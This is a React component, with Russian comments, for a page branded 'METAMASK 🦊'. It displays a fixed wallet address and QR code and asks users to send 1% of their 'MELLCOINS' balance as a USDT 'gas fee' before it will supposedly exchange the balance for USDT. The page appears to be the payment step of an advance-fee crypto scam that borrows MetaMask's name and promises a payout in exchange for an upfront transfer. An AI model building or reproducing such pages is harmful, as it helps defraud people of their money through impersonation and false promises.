import React, { useContext } from "react";
import { Link } from "react-router-dom";
import UserContext from "../context/UserContext";
import QRCode from "qrcode.react"; // Нужно установить библиотеку qrcode.react: npm install qrcode.react
import "./CryptoReceive.css"; // Создайте файл стилей CryptoReceive.css

const CryptoReceive = () => {
  const { contextData } = useContext(UserContext);
  const { balance, setBalance } = contextData;
  const cryptoAddress = "0xa7778106aAB9522067266a787743366b97Aa67A4"; // Пример крипто-адреса
  const usdt = 0.9149;
  const per = 0.01;
  const handleCopyClick = () => {
    navigator.clipboard
      .writeText(cryptoAddress)
      .then(() => alert("Copied!"))
      .catch((err) => alert("Failed to copy address: " + err));
  };

  return (
    <div className="crypto-receive">
      <div className="crypto-overlay">
        <div className="crypto-back-button">
          <Link to="/claim" className="crypto-back-link">
            &lt; Назад
          </Link>
        </div>
        <div className="crypto-title">METAMASK 🦊</div>
        <div className="crypto-info">
          <p>
            Gas fee {(balance * per).toFixed(3)} USDT(BEP20) payment for MELL to
            USDT exchange.
          </p>
        </div>
        <div className="crypto-qr-code">
          <QRCode value={cryptoAddress} size={128} />
        </div>
        <div className="crypto-address">
          <input
            type="text"
            value={cryptoAddress}
            readOnly
            className="crypto-address-input"
          />
          <button className="crypto-copy-button" onClick={handleCopyClick}>
            Копировать
          </button>
        </div>
        <div className="crypto-note">
          <div className="crypto-note-textarea">
            *Для обмена {balance.toFixed(6)} MELLCOINS to{" "}
            {(usdt * balance).toFixed(6)} USDT отправте{" "}
            {(balance * per).toFixed(3)} USDT (BEP20 only). Убедитесь, что вы
            выбрали соответствующую сеть, в противном случае средства могут быть
            утеряны.
          </div>
        </div>
      </div>
    </div>
  );
};

export default CryptoReceive;
